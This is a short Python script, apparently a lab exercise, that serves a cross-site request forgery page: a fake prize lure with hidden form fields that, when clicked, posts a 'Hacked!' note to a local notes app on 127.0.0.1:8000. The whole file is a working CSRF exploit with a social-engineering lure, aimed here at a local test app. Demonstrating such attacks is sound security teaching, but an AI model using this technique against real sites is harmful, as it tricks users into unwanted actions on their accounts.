from http.server import HTTPServer, BaseHTTPRequestHandler

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()

        html = """
        <form action="http://127.0.0.1:8000/notes/create_note/" method="post">
            <p>You have won $100 000!</p>
            <p>Click here to claim your prize:</p>
            <input type="hidden" name="title" value="Hacked!">
            <input type="hidden" name="content" value="You have been hacked!">
            <input type="submit" value="Claim prize!">
        </form>
        """
        self.wfile.write(html.encode())

port = 9000
server = HTTPServer(("127.0.0.1", port), Handler)
print(f"Running on http://127.0.0.1:{port}")
server.serve_forever()